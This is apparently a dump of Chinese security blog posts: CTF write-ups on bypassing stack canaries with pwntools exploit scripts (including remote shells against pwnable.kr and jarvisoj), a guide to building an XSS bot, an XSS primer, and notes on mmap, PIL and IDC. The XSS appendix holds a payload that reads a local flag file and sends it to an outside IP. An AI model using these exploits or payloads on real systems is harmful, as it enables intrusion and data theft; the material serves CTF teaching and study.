大体思路就是通过格式化字符串读取canary的值，然后在栈溢出的padding块把canary所在位置的值用正确的canary替换，从而绕过canary的检测。 示例程序： 123456789101112131415161718192021222324252627282930313233/*** compile cmd: gcc source.c -m32 -o bin**/#include &lt;stdio.h&gt;#include &lt;unistd.h&gt;void getflag(void) &#123; char flag[100]; FILE *fp = fopen(&quot;./flag&quot;, &quot;r&quot;); if (fp == NULL) &#123; puts(&quot;get flag error&quot;); &#125; fgets(flag, 100, fp); puts(flag);&#125;void init() &#123; setbuf(stdin, NULL); setbuf(stdout, NULL); setbuf(stderr, NULL);&#125;void fun(void) &#123; char buffer[100]; read(STDIN_FILENO, buffer, 120);&#125;int main(void) &#123; char buffer[6]; init(); scanf(&quot;%6s&quot;,buffer); printf(buffer); fun();&#125; 在第一次scanf的时候输入“%7$x”打印出canary，在fun中利用栈溢出控制eip跳转到getflag。 poc: 1234567891011121314from pwn import *context.log_level = &apos;debug&apos;cn = process(&apos;./bin&apos;)cn.sendline(&apos;%7$x&apos;)canary = int(cn.recv(),16)print hex(canary)cn.send(&apos;a&apos;*100 + p32(canary) + &apos;a&apos;*12 + p32(0x0804863d))flag = cn.recv()log.success(&apos;flag is:&apos; + flag) 绕过canary - 针对调用方式一致linux下的canary有个明显的特性：那就是每个使用了canary的函数，其canary的值是完全一样的。其实原理很简单，从上面给出的x86和x64的两种canary生成图示可以看出，linux的canary总是和large gs:14h或者fs:28h有关。这也就意味着，只要这个值不变，那么canary的值也不会变。显然，程序运行之后，这个地址的值不会发生改变。 那么，这也产生了一种攻击方法，通过存在漏洞的函数之外的函数，间接打印或者求出canary，那么这个canary可以运用到任意函数中（包括漏洞函数）。 漏洞利用样例就是pwnbale.kr中的md5 calculator那道题 题目描述： We made a simple MD5 calculator as a network service.Find a bug and exploit it to get a shell. Download : http://pwnable.kr/bin/hashhint : this service shares the same machine with pwnable.kr web service Running at : nc pwnable.kr 9002 sph7 已经将这个问题完美解决，这里基本上摘抄于其原文 ida打开文件，发现关键函数是process_hash，代码如下 12345678910111213141516171819int process_hash()&#123; int v0; // ST14_4@3 void *ptr; // ST18_4@3 char v3; // [sp+1Ch] [bp-20Ch]@1 int v4; // [sp+21Ch] [bp-Ch]@1 v4 = *MK_FP(__GS__, 20); memset(&amp;v3, 0, 0x200u); while ( getchar() != 10 ); memset(g_buf, 0, sizeof(g_buf)); fgets(g_buf, 1024, stdin); memset(&amp;v3, 0, 0x200u); v0 = Base64Decode(g_buf, &amp;v3); ptr = (void *)calc_md5(&amp;v3, v0); printf(\"MD5(data) : %s\\n\", ptr); free(ptr); return *MK_FP(__GS__, 20) ^ v4;&#125; 这里的问题在与给g_buf分配了1024bytes的空间，但是只给u分配了512bytes的空间，而1024字节的base64解码之后的长度为768，所以这里有一个栈溢出。但是代码中有栈cookie，所以光靠这里是不能利用的。 继续看代码，发现另一个函数 12345678910111213141516171819202122int my_hash()&#123; int result; // eax@4 int v1; // edx@4 signed int i; // [sp+0h] [bp-38h]@1 char v3[32]; // [sp+Ch] [bp-2Ch]@2 int v4; // [sp+2Ch] [bp-Ch]@1 v4 = *MK_FP(__GS__, 20); for ( i = 0; i &lt;= 7; ++i ) *(_DWORD *)&amp;v3[4 * i] = rand(); result = *(_DWORD *)&amp;v3[16] - *(_DWORD *)&amp;v3[24] + *(_DWORD *)&amp;v3[28] + v4 + *(_DWORD *)&amp;v3[8] - *(_DWORD *)&amp;v3[12] + *(_DWORD *)&amp;v3[4] + *(_DWORD *)&amp;v3[20]; v1 = *MK_FP(__GS__, 20) ^ v4; return result;&#125; 在这个函数中，栈cookie被用来生成了一个hash值，而这个hash值会在交互中给出，结合题目中提到的提示，bin服务和pwnable.kr运行在同一台机器上，也就是说时间相同，这样就可以反算出栈cookie，从而get shell了。 大概思路清晰之后，开始完成exp，首先是用c算出栈cookie 12345678910111213#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;int main(int argc, char **argv) &#123; int m = atoi(argv[2]); int rands[8]; srand(atoi(argv[1])); for (int i = 0; i &lt;= 7; i++) rands[i] = rand(); m -= (rands[1] + rands[2] - rands[3] + rands[4] + rands[5] - rands[6] + rands[7]); printf(\"%x\\n\", m); return 0;&#125; 完成cookie的计算，分析到这里就可以写exp了，主要思路是溢出掉v3，用验证码和时间计算出栈cookie，最后调用system(&quot;/bin/sh&quot;) 12345678910111213141516171819202122232425import osimport timefrom pwn import *p = remote(\"pwnable.kr\", 9002)t = int(time.time())print p.recvuntil(\"captcha\")captcha = p.recvline()captchapos = captcha.find(' : ')+len(' : ')captcha = captcha[captchapos:].strip()p.sendline(captcha)print p.recvline()print p.recvline()cmd = \"./hash %s %s\" % (t, captcha)cookie = \"0x\" + os.popen(cmd).read().strip()payload = 'A' * 512 # 512 byte v3payload += p32(int(cookie, 16))payload += 'A' * 12payload += p32(0x08049187) # systempayload += p32(0x0804B0E0 + 537*4/3) # .bss =&gt; address of /bin/shpayload = b64e(payload)payload += \"/bin/sh\\0\"p.sendline(payload)p.interactive() 绕过canary - 针对fork的进程对fork而言，作用相当于自我复制，每一次复制出来的程序，内存布局都是一样的，当然canary值也一样。那我们就可以逐位爆破，如果程序GG了就说明这一位不对，如果程序正常就可以接着跑下一位，直到跑出正确的canary。 另外有一点就是canary的最低位是0x00，这么做为了防止canary的值泄漏。比如在canary上面是一个字符串，正常来说字符串后面有0截断，如果我们恶意写满字符串空间，而程序后面又把字符串打印出来了，那个由于没有0截断canary的值也被顺带打印出来了。设计canary的人正是考虑到了这一点，就让canary的最低位恒为零，这样就不存在上面截不截断的问题了。 示例程序： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748/*** compile cmd: gcc source.c -m32 -o bin**/#include &lt;stdio.h&gt;#include &lt;unistd.h&gt;#include &lt;stdlib.h&gt;#include &lt;sys/wait.h&gt;void getflag(void) &#123; char flag[100]; FILE *fp = fopen(&quot;./flag&quot;, &quot;r&quot;); if (fp == NULL) &#123; puts(&quot;get flag error&quot;); exit(0); &#125; fgets(flag, 100, fp); puts(flag);&#125;void init() &#123; setbuf(stdin, NULL); setbuf(stdout, NULL); setbuf(stderr, NULL);&#125;void fun(void) &#123; char buffer[100]; read(STDIN_FILENO, buffer, 120);&#125;int main(void) &#123; init(); pid_t pid; while(1) &#123; pid = fork(); if(pid &lt; 0) &#123; puts(&quot;fork error&quot;); exit(0); &#125; else if(pid == 0) &#123; puts(&quot;welcome&quot;); fun(); puts(&quot;recv sucess&quot;); &#125; else &#123; wait(0); &#125; &#125;&#125; poc脚本： 1234567891011121314151617181920from pwn import *context.log_level = &apos;debug&apos;cn = process(&apos;./bin&apos;)cn.recvuntil(&apos;welcome\\n&apos;)canary = &apos;\\x00&apos;for j in range(3): for i in range(0x100): cn.send(&apos;a&apos;*100 + canary + chr(i)) a = cn.recvuntil(&apos;welcome\\n&apos;) if &apos;recv&apos; in a: canary += chr(i) breakcn.sendline(&apos;a&apos;*100 + canary + &apos;a&apos;*12 + p32(0x0804864d))flag = cn.recv()cn.close()log.success(&apos;flag is:&apos; + flag) 故意触发canary - ssp leak这题可以参考jarvis oj中 smashes一题的解题方法中的前一半。 这里我偷个懒，直接把之前写的wp扔过来了，反正原理都在题里了。 题目描述： Smashes, try your best to smash!!! nc pwn.jarvisoj.com 9877 smashes.44838f6edd4408a53feb2e2bbfe5b229 首先查看保护 12345678$ checksec pwn_smashes [*] &apos;/home/veritas/pwn/jarvisoj/smashes/pwn_smashes&apos; Arch: amd64-64-little RELRO: No RELRO Stack: Canary found NX: NX enabled PIE: No PIE (0x400000) FORTIFY: Enabled 有canary，有nx ida找到关键函数： 12345678910111213141516171819202122232425262728293031__int64 func_1()&#123; __int64 v0; // rax@1 __int64 v1; // rbx@2 int v2; // eax@3 __int64 buffer; // [sp+0h] [bp-128h]@1 __int64 canary; // [sp+108h] [bp-20h]@1 canary = *MK_FP(__FS__, 40LL); __printf_chk(1LL, (__int64)&quot;Hello!\\nWhat&apos;s your name? &quot;); LODWORD(v0) = _IO_gets(&amp;buffer); if ( !v0 )label_exit: _exit(1); v1 = 0LL; __printf_chk(1LL, (__int64)&quot;Nice to meet you, %s.\\nPlease overwrite the flag: &quot;); while ( 1 ) &#123; v2 = _IO_getc(stdin); if ( v2 == -1u ) goto label_exit; if ( v2 == &apos;\\n&apos; ) break; flag[v1++] = v2; if ( v1 == 32 ) // 32长度 goto thank_you; &#125; memset((void *)((signed int)v1 + 0x600D20LL), 0, (unsigned int)(32 - v1));thank_you: puts(&quot;Thank you, bye!&quot;); return *MK_FP(__FS__, 40LL) ^ canary; 首先，函数使用了gets(的某种形态？)来获取输入，好处是我们可以输入无限长度的字符串，坏处是发送过去的字符串的尾部会以\\n结尾，所以无法绕过canary。 纵观整个程序，似乎没有什么地方能够绕过canary，也没有什么地方能打印flag。 但如果你换个思路，我们故意触发canary的保护会怎么样？ 事实上，就有一种攻击方法叫做SSP（Stack Smashing Protector ） leak。 如果canary被我们的值覆盖而发生了变化，程序会执行函数___stack_chk_fail() 一般情况下，我们执行了这个函数，输出是这样的： 我们来看一下源码__stack_chk_fail : 12345void __attribute__ ((noreturn)) __stack_chk_fail (void) &#123; __fortify_fail (&quot;stack smashing detected&quot;); &#125; fortify_fail 123456789void __attribute__ ((noreturn)) __fortify_fail (msg) const char *msg; &#123; /* The loop is added only to keep gcc happy. */ while (1) __libc_message (2, &quot;*** %s ***: %s terminated\\n&quot;, msg, __libc_argv[0] ?: &quot;&lt;unknown&gt;&quot;) &#125; libc_hidden_def (__fortify_fail) 可见，__libc_message 的第二个%s输出的是argv[0]，argv[0]是指向第一个启动参数字符串的指针，而在栈中，大概是这样一个画风 所以，只要我们能够输入足够长的字符串覆盖掉argv[0]，我们就能让canary保护输出我们想要地址上的值。 听起来很美妙，我们可以试试看。 先写如下poc: 123456789101112131415161718192021from pwn import *context.log_level = &apos;debug&apos;#cn = remote(&apos;pwn.jarvisoj.com&apos;, 9877)cn = process(&apos;pwn_smashes&apos;)cn.recv()cn.sendline(p64(0x0000000000400934)*200) #直接用我们所需的地址占满整个栈cn.recv()cn.sendline()cn.recv()#.rodata:0000000000400934 aHelloWhatSYour db &apos;Hello!&apos;,0Ah ; DATA XREF: func_1+1o#.rodata:0000000000400934 db &apos;What&apos;,27h,&apos;s your name? &apos;,0#.rodata:000000000040094E ; char s[]#.rodata:000000000040094E s db &apos;Thank you, bye!&apos;,0 ; DATA XREF: func_1:loc_400878o#.rodata:000000000040095E align 20h#.rodata:0000000000400960 aNiceToMeetYouS db &apos;Nice to meet you, %s.&apos;,0Ah#.rodata:0000000000400960 ; DATA XREF: func_1+3Fo#.rodata:0000000000400960 db &apos;Please overwrite the flag: &apos;,0#.rodata:0000000000400992 align 8#.rodata:0000000000400992 _rodata ends 输出结果令我们满意 1234[DEBUG] Received 0x56 bytes: &apos;Thank you, bye!\\n&apos; &apos;*** stack smashing detected ***: Hello!\\n&apos; &quot;What&apos;s your name? terminated\\n&quot; 但是，当我们把地址换成flag的地址时，却可以发现flag并没有被打印出来，那是因为在func_1函数的结尾处有这样一句： 1memset((void *)((signed int)v1 + 0x600D20LL), 0, (unsigned int)(32 - v1)); 所以，无论如何，等我们利用canary打印flag的时候，0x600D20上的值已经被完全覆盖了，因此我们无法从0x600D20处得到flag。 这就是这道题的第二个考点，ELF的重映射。当可执行文件足够小的时候，他的不同区段可能会被多次映射。这道题就是这样。 可见，其实在0x400d20处存在flag的备份。 因此，最终的poc为： 12345678910from pwn import *context.log_level = &apos;debug&apos;cn = remote(&apos;pwn.jarvisoj.com&apos;, 9877)#cn = process(&apos;pwn_smashes&apos;)cn.recv()cn.sendline(p64(0x0400d20)*200)cn.recv()cn.sendline()cn.recv()","tags":[{"name":"stack","slug":"stack","permalink":"http://yoursite.com/tags/stack/"},{"name":"canary","slug":"canary","permalink":"http://yoursite.com/tags/canary/"}]},{"title":"Python的图片处理库PIL","date":"2017-09-21T13:02:35.000Z","path":"2017/09/21/Python的图片处理库PIL/","text":"PIL 是Python Image Library的缩写，意思即为Python的图片处理库 PIL的官方文档是http://effbot.org/imagingbook/pil-index.htm 内容很全，也不需赘述","tags":[{"name":"python","slug":"python","permalink":"http://yoursite.com/tags/python/"}]},{"title":"xss bot介绍","date":"2017-09-21T09:22:02.000Z","path":"2017/09/21/xss-bot介绍/","text":"这篇文章摘抄与LoRexxar的的博客https://lorexxar.cn/2017/05/12/xss-bot2/ bot是什么？原意是robot的意思，也指一个在没有人工干预下在因特网上搜索信息的程序。这里的xss bot指的是：将攻击者提供的攻击代码在服务器上模拟执行的程序。 因此xss bot应该具有较强的稳定性！ xss在近几年的ctf形式中，越来越受到了人们的重视，但是出xss的题目最重要的可能就是xss bot的问题了，一个合格的xss bot要稳定还能避免搅屎。 下面我们就来看看一个xss bot是怎么完成的。 bot之前一般来说，对于xss bot来说，最重要的是要bot能够执行js，事情的本质是我们需要一个浏览器内核来解析js，这里我们一般会用selenium+webdriver。 而webdriver一般有3种chrome webdriver、firefox webdriver、phantomjs。 seleniumselenium是用来控制webdriver的接口的，网上搜到的大部分脚本大部门都是java控制的，下面我的所有脚本都使用python操作selenium，下面有份不太完整的文档。 http://www.seleniumhq.org/docs/03_webdriver.jsp 只要在python文件前引入selenium模块。 1234import seleniumfrom selenium import webdriver from selenium.webdriver.common.keys import Keys from selenium.common.exceptions import WebDriverException chrome webdriver如果我们想要使用chrome webdriver，除了安装chrome浏览器本身，还需要安装webdriver。 https://sites.google.com/a/chromium.org/chromedriver/downloads 由于webdriver版本众多，api和语法也有所不同，这里推荐最新版chrome+最新版webdriver。 因为环境相异，所以我们可能需要在脚本里设置chrome webdriver的路径 1234567891011121314#!/usr/bin/env python# -*- coding:utf-8 -*-import seleniumfrom selenium import webdriver from selenium.webdriver.common.keys import Keys from selenium.common.exceptions import WebDriverExceptionimport os chromedriver = &quot;C:\\Users\\Administrator\\AppData\\Local\\Google\\Chrome\\Application\\chromedriver.exe&quot; os.environ[&quot;webdriver.chrome.driver&quot;] = chromedriver browser = webdriver.Chrome(chromedriver) url = &quot;http://xxxx&quot; browser.get(url)browser.quit() firefox webdriverfirefox和chrome相同，需要一个geckodriver来支持，和chrome类似。 https://github.com/mozilla/geckodriver/releases/ 在linux下，需要添加映射到/bin/ 1chmod +x geckodriver 在windows下，需要添加geckodriver到环境变量中。 123456789101112#!/usr/bin/env python# -*- coding:utf-8 -*-import seleniumfrom selenium import webdriver from selenium.webdriver.common.keys import Keys from selenium.common.exceptions import WebDriverExceptionbrowser = webdriver.Firefox()url = &quot;http://xxxx&quot; browser.get(url)browser.quit() phantomjsphantomjs和别的浏览器本质上没什么区别，差不多也是类似于浏览器的内核，优势其实是多平台支持，而且不需要浏览器支持，所以一般爬虫用的比较多。 下载地址http://phantomjs.org/download.html 123456789101112#!/usr/bin/env python# -*- coding:utf-8 -*-import seleniumfrom selenium import webdriverfrom selenium.common.exceptions import WebDriverExceptionphantomjs_path = &quot;sssssssss/phantomjs&quot;driver = webdriver.PhantomJS(executable_path=phantomjs_path)url = &quot;http://xxxx&quot; browser.get(url)browser.quit() bot的背后比起爬虫来不一样，因为一个爬虫只要打开一次获取数据就好了，但是作为xss bot必须周期性的打开页面，执行攻击者的相应payload，既然bot的持续时间一般是24小时-48小时，那bot就不可能时时刻刻都有人盯着，也就必须放在服务器上，我们来研究一下不同的webdriver在服务器的差异。 chrome和firefox的webdriver都有一个特点，就是需要桌面，如果执行脚本的服务器上不包含桌面，那么我就需要别的方法来构造一个虚拟的桌面。 如果在windows服务器上，windows服务器最大的特点就是自带桌面，我们一般通过rdp管理，所以windows服务器上跑xss bot的话不需要做专门的处理。 如果在linux服务器上，我们一般通过ssh管理linux服务器，那么我就需要一段神秘代码来执行xss bot脚本，这是一段火日聚聚教我的代码。 1234from pyvirtualdisplay import Displaydisplay = Display(visible=0, size=(800,800))display.start() 在phantomjs的webdriver下，就不会有这样的问题，因为phantomjs本身就是多平台的，只是很多时候xss bot需要保证浏览器的特性，这种时候，我们往往不会使用phantomjs作为xss bot的首选。 完成bot上面我们着重讲了各种webdriver，下面我就来针对不同的xss题目来谈谈。 report bug型xss一般来说，xss题目最常见的就是report bug或者是留言型xss，后台接口唯一，攻击者向目标发送信息，bot需要访问页面执行js。 在ctf比赛中，处理方式五花八门，这里我推荐1种解决办法。 在攻击者页面提供测试接口和攻击接口，然后攻击者接口设置验证码，避免攻击者无意义的刷payload。（具体可以见0ctf的处理方式） 为了避免干扰，最好将攻击者攻击数据存入数据库，添加标志位以判断数据是否被访问过，题目专门添加功能用作check数据库内是否存在未访问数据（最好添加此功能在题目中，因为bot有可能不在题目服务器，远程数据库连接是个危险的行为！！） 判断存在时，bot开启webdriver访问相应的页面（通过添加cookie或者ip check的方式判断访问来源），相应的页面从数据库取出数据，bot访问完成后关闭。 大致流程如下： 我这里贴上bot部分的代码 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465#!/usr/bin/env python# -*- coding:utf-8 -*-import seleniumfrom selenium import webdriver from selenium.webdriver.common.keys import Keys from selenium.common.exceptions import WebDriverExceptionimport os import time import requestsfrom pyvirtualdisplay import Displaydisplay = Display(visible=0, size=(800,800))display.start()while 1: try: s = requests.Session() url = 'http://xxx/checksql.php' r = s.get(url) if \"存在\" in r.text: try: chromedriver = \"C:\\Users\\Administrator\\AppData\\Local\\Google\\Chrome\\Application\\chromedriver.exe\" os.environ[\"webdriver.chrome.driver\"] = chromedriver browser = webdriver.Chrome(chromedriver) browser.set_page_load_timeout(10) browser.set_script_timeout(10) url = \"http://xxxxxx/admin_321321321.php\" browser.get(url) browser.add_cookie(&#123;'name': 'admin', 'value' : 'arandomstring', 'path' : '/'&#125;) browser.get(url) while 1: try: browser.switch_to_alert().accept() except selenium.common.exceptions.NoAlertPresentException: break print browser.title print time.strftime(\"%Y-%m-%d %X\", time.localtime()) time.sleep(10) browser.quit() time.sleep(1) except Exception as e: print \"[error] \"+str(e) browser.quit() else: print time.strftime(\"%Y-%m-%d %X\", time.localtime()) print \"[info] no unread messages\" exit(0) except Exception as e: print \"[error] \"+str(e) 上面的代码配合crontab应该可以很好的应付这类xss的各种问题 聊天类的交互式xss这类xss最明显的特点就是admin用户和别的用户并没有区别，也就是说bot想要打开被攻击者注入的页面，也必须经过登录，服务端设置session来登录，那么上面的办法就行不通了，最好的办法就是模拟登录。 这类xss最大的问题其实就是信息的隔离方式，如果聊天的交互方式本身就是显示在同一页面上的话，很显然的问题就是，如果有一个攻击者试图干扰bot的运行，他只要再每个round发送&lt;xmp&gt;就可以导致js无法执行，这是个我到现在还没想明白的问题。先分享现在我使用的bot 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667#!/usr/bin/env python# -*- coding:utf-8 -*-import seleniumfrom selenium import webdriver from selenium.webdriver.common.keys import Keys from selenium.common.exceptions import WebDriverExceptionimport os import time import requestsfrom pyvirtualdisplay import Displaydisplay = Display(visible=0, size=(800,800))display.start()for i in xrange(2): try: browser = webdriver.Firefox() browser.set_page_load_timeout(10) browser.set_script_timeout(10) url = \"http://52.80.63.91/login.php\" browser.get(url) elem = browser.find_element_by_name(\"user\") elem.clear() elem.send_keys('admin') elem = browser.find_element_by_name(\"pass\") elem.clear() elem.send_keys('admmin332indadmin33213') elem = browser.find_element_by_name(\"login\") elem.click() print \"login success\" browser.add_cookie(&#123;'name': 'admin', 'value' : 'arandomstring', 'path' : '/adminshigesha233e3333/'&#125;) while 1: try: browser.switch_to_alert().accept() except selenium.common.exceptions.NoAlertPresentException: break print browser.title print time.strftime(\"%Y-%m-%d %X\", time.localtime()) time.sleep(10) browser.quit() time.sleep(1) except Exception as e: print \"[ERROR] \"+str(e) #important browser.quit()url2 = 'http://xxxx/cl33e3ar5ql.php'r = s.get(url2)print r.textprint time.strftime(\"%Y-%m-%d %X\", time.localtime()) 上面的代码通过setkey模拟登录，然后设置后台的cookie，每次payload执行2次，然后清理掉admin除预留信息以外的所有payload，避免恶意payload导致的所有payload无效。 配合crontab可以保证bot的持久性，如果不放心bot的稳定性，还可以在脚本执行结束后，执行命令kill掉所有的firefox残留进程。 到此为止，一个完整的xss bot就完成了，虽然可能不是最完美的解决方案，希望会有更好的解决办法:&gt;","tags":[{"name":"xss","slug":"xss","permalink":"http://yoursite.com/tags/xss/"}]},{"title":"xss简介","date":"2017-09-21T08:24:13.000Z","path":"2017/09/21/xss简介/","text":"自从xss被发现之后，OWASP上经常会出现它的身影。一开始xss作为一种攻击方式，应用并不算广。但是随着漏洞利用的深入钻研，安全研究者们逐渐发现xss的危害，特别是在用户授权与管理方面。 国内外各大web安全检测厂商，已经在其产品中加入了xss检查、过滤等功能。 1、XSS原理JavaScript可以用来获取用户的Cookie、改变网页内容、URL跳转。于是，我们就可以从存在XSS漏洞的网站中，盗取用户Cookie、黑掉页面、导航到恶意网站。 通常使用方式来加载外部脚本，而在x.txt中就存放着攻击者的恶意JavaScript代码，这段代码可能是用来盗取用户的Cookie，也可能是监控键盘记录等恶意行为。 备注：JavaScript加载外部的代码文件可以是任意扩展名(无扩展名也可以) 2、XSS类型2.1 反射型XSS反射型XSS也被称为非持久性XSS，是现在最容易出现的一种XSS漏洞。 XSS的Payload一般是写在URL中，之后设法让被害者点击这个链接。 1234567&lt;?php username = _GET['username']; echo $username; ?&gt; 利用样例：http://www.secbug.org/xss.php?username=&lt;script&gt;alert(/xss/)&lt;/script&gt; 2.2 存储型XSS存储型XSS又被称为持久性XSS，存储型XSS是最危险的一种跨站脚本。 存储型XSS被服务器端接收并存储，当用户访问该网页时，这段XSS代码被读出来响应给浏览器。 反射型XSS与DOM型XSS都必须依靠用户手动去触发，而存储型XSS却不需要。 测试步骤如下，以留言板为例： （1）添加正常的留言，使用Firebug快速寻找显示标签 （2）判断内容输出（显示）的地方是在标签内还是在标签属性内，或者在其他地方。如果显示区域不在HTML属性内，则可以直接使用xss代码注入。如果在属性内，需要先闭合标签再写入xss代码。如果不能得知内容输出的具体位置，则可以使用模糊测试方案。 （3）在插入xss payload代码后，重新加载留言页面，xss代码被浏览器执行。 2.3 DOM XSSDOM的全称为Document Object Model，即文档对象模型。 基于DOM型的XSS是不需要与服务器交互的，它只发生在客户端处理数据阶段。简单理解DOM XSS就是出现在javascript代码中的xss漏洞。 123456789&lt;script&gt; var temp = document.URL;//获取URL var index = document.URL.indexOf(\"content=\")+4; var par = temp.substring(index); document.write(decodeURI(par));//输入获取内容 &lt;/script&gt; 利用样例：http://www.secbug.org/dom.html?content=&lt;script&gt;alert(/xss/)&lt;/script&gt; 这种利用也需要受害者点击链接来触发，DOM型XSS是前端代码中存在了漏洞，而反射型是后端代码中存在了漏洞。 反射型和存储型xss是服务器端代码漏洞造成的，payload在响应页面中，在dom xss中，payload不在服务器发出的HTTP响应页面中，当客户端脚本运行时（渲染页面时），payload才会加载到脚本中执行。 3、利用工具3.1 xss接收工具谈到xss的利用工具，这里不得不提到火日大神，其在github上的工具https://github.com/firesunCN/BlueLotus_XSSReceiver 这个工具是ctf中xss应用的经典工具 另外一个工具就是nc 123456789$ nc -l -p 8080GET /1.jpg HTTP/1.1Host: 10.254.20.127:8080User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:55.0) Gecko/20100101 Firefox/55.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh,zh-CN;q=0.5Accept-Encoding: gzip, deflateConnection: keep-aliveUpgrade-Insecure-Requests: 1 当外界请求http://10.254.20.127:8080/1.jpg的时候，就会出现上面的信息。 3.2 xss检测工具xss检测工具很多，现在xsser、xssf 说真的，两个检测工具不怎么好用，还不如手工呢！ 另外就是xssor，可以访问 https://github.com/evilcos/xssor2 http://xssor.io/ 4、附录xss一般请求方式 1?evilcode=&lt;script&gt;&lt;img src=&quot;http://xxxx/xss.jpg&quot;/&gt;&lt;/script&gt; 1?evalcode=&lt;script&gt;var xmlhttp= new XMLHttpRequest();xmlhttp.open(&quot;GET&quot;,&quot;file:///var/www/html/flag.php&quot;,true);xmlhttp.onload = function () &#123;content = btoa(xmlhttp.responseText);window.location.href=&quot;http://118.190.78.155:8080/index.php?a=&quot;%2bcontent;&#125;;xmlhttp.send(null);&lt;/script&gt; btoa(&quot;str&quot;) ===&gt; base64加密字符串 atob(&quot;ABSCRF==&quot;) ===&gt; base64解密字符串","tags":[{"name":"xss","slug":"xss","permalink":"http://yoursite.com/tags/xss/"}]},{"title":"Linux内存映射函数mmap函数详解","date":"2017-09-19T07:48:19.000Z","path":"2017/09/19/Linux内存映射函数mmap函数详解/","text":"mmap将一个文件或者其它对象映射进内存。文件被映射到多个页上，如果文件的大小不是所有页的大小之和，最后一个页不被使用的空间将会清零。mmap在用户空间映射调用系统中作用很大。 函数原型 void mmap(void start,size_t length,int prot,int flags,int fd,off_t offset); int munmap(void* start,size_t length); mmap 必须以PAGE_SIZE为单位进行映射，而内存也只能以页为单位进行映射，若要映射非PAGE_SIZE整数倍的地址范围，要先进行内存对齐，强行以PAGE_SIZE的倍数大小进行映射。 用法下面说一下内存映射的步骤: 用open系统调用打开文件, 并返回描述符fd. 用mmap建立内存映射, 并返回映射首地址指针start. 对映射(文件)进行各种操作, 显示(printf), 修改(sprintf) 用munmap(void *start, size_t length)关闭内存映射. 用close系统调用关闭文件fd. mmap函数的主要用途1、将一个普通文件映射到内存中，通常在需要对文件进行频繁读写时使用，这样用内存读写取代I/O读写，以获得较高的性能； 2、将特殊文件进行匿名内存映射，可以为关联进程提供共享内存空间； 3、为无关联的进程提供共享内存空间，一般也是将一个普通文件映射到内存中。 mmap函数说明参数start 指向欲映射的内存起始地址，通常设为 NULL，代表让系统自动选定地址，映射成功后返回该地址。 参数length 代表将文件中多大的部分映射到内存。 参数prot 映射区域的保护方式。可以为以下几种方式的组合： PROT_EXEC 映射区域可被执行 PROT_READ 映射区域可被读取 PROT_WRITE 映射区域可被写入 PROT_NONE 映射区域不能存取 参数flags 影响映射区域的各种特性。在调用mmap()时必须要指定MAP_SHARED 或MAP_PRIVATE。 MAP_FIXED 如果参数start所指的地址无法成功建立映射时，则放弃映射，不对地址做修正。通常不鼓励用此标志。 MAP_SHARED对映射区域的写入数据会复制回文件内，而且允许其他映射该文件的进程共享。 MAP_PRIVATE 对映射区域的写入操作会产生一个映射文件的复制，即私人的“写入时复制”（copy on write）对此区域作的任何修改都不会写回原来的文件内容。 MAP_ANONYMOUS建立匿名映射。此时会忽略参数fd，不涉及文件，而且映射区域无法和其他进程共享。 MAP_DENYWRITE只允许对映射区域的写入操作，其他对文件直接写入的操作将会被拒绝。 MAP_LOCKED 将映射区域锁定住，这表示该区域不会被置换（swap）。 参数fd 要映射到内存中的文件描述符。如果使用匿名内存映射时，即flags中设置了MAP_ANONYMOUS，fd设为-1。有些系统不支持匿名内存映射，则可以使用fopen打开/dev/zero文件，然后对该文件进行映射，可以同样达到匿名内存映射的效果。 参数offset 文件映射的偏移量，通常设置为0，代表从文件最前方开始对应，offset必须是分页大小的整数倍。 返回值 若映射成功则返回映射区的内存起始地址，否则返回MAP_FAILED(－1)，错误原因存于errno 中。 错误代码 EBADF 参数fd不是有效的文件描述词 EACCES 存取权限有误。如果是MAP_PRIVATE 情况下文件必须可读，使用 MAP_SHARED则要有PROT_WRITE以及该文件要能写入。 EINVAL 参数start、length 或offset有一个不合法。 EAGAIN 文件被锁住，或是有太多内存被锁住。 ENOMEM 内存不足。","tags":[{"name":"heap","slug":"heap","permalink":"http://yoursite.com/tags/heap/"},{"name":"linux","slug":"linux","permalink":"http://yoursite.com/tags/linux/"}]},{"title":"IDA的调试脚本idc","date":"2017-09-18T13:30:24.000Z","path":"2017/09/18/IDA的调试脚本idc/","text":"IDA的脚本有两种，一种是idc，另一种是IDAPython。 可以通过File-&gt;Script file；File-&gt;Script command访问IDA的脚本引擎。 1、IDC语言1.1 IDC变量IDC的3种数据类型：整数（IDA文档使用类型名称long）、字符串和浮点值。当然也包括对象、引用和函数指针 1.1.1 局部变量声明12auto addr, reg, val; //legal, multiple variables declared with no initializersauto count = 0; // declaration with initialization IDC认可使用/**/的C风格多行注释，//的行注释 1.1.2 全局变量声明123456extern outsideGlobal;static main()&#123; extern insideGlobal; outsideGlobal = &quot;Global&quot;; insideGlobal = 1;&#125; 可以在函数内部或外部声明全部变量，但不能子啊声明变量的时候提供初始值。 1.2 IDC表达式除了少数几个特例外，IDC几乎支持C的所有算数和逻辑运算符，包括三元运算(?:)，但是不支持op=（+=、*=、&gt;&gt;=等）形式的符合赋值运算符。 IDC的字符串运算与C的有所不同。在IDC中，支持类python的字符串复制、拼接、分片操作。 123auto str=&quot;String to slice&quot;;auto s1,s2,s3,s4;s1 = str[7:9]; 需要注意的是IDC没有数组数据类型。 1.3 IDC语句IDC的语句以很好结束。switch语句是IDC唯一不支持的C风格复合语句。在使用for循环的时候，需要记住的是，IDC不支持复合赋值运算符op=。 并且IDC引入了try/catch块和相关的switch语句，在语法上它们类似C++一场处理。 IDC的块中，可以声明新的变量，只要变量声明位于花括号内的第一个语句即可。但是IDC并不严格限制新引入的变量的作用范围，因此，你可以在声明这些变量的花括号以外引用它们。 1.4 IDC函数IDC仅仅在独立程序(.idc文件)中支持用户定义的函数。iDC命令对话框不支持用户定义的函数。IDC用于声明用户定义的函数的语法与C语言的差异甚大。在IDC中，static关键字用于引入一个用户定义的函数，函数的参数列表仅包含一个以逗号分隔的参数名列表。 1234static my_func(x, y, z)&#123; auto a,b,c; ...... &#125; 并且参数可以采用传值或者传参的方式。 现在已经可以将函数引用作为一个参数传递给另一个函数，并将函数引用作为函数的返回结果。下面的代码清单说明了使用函数参数和函数作为返回值的情况。 1234567891011static getFunc()&#123; return Message; //return the built-in Message function as a 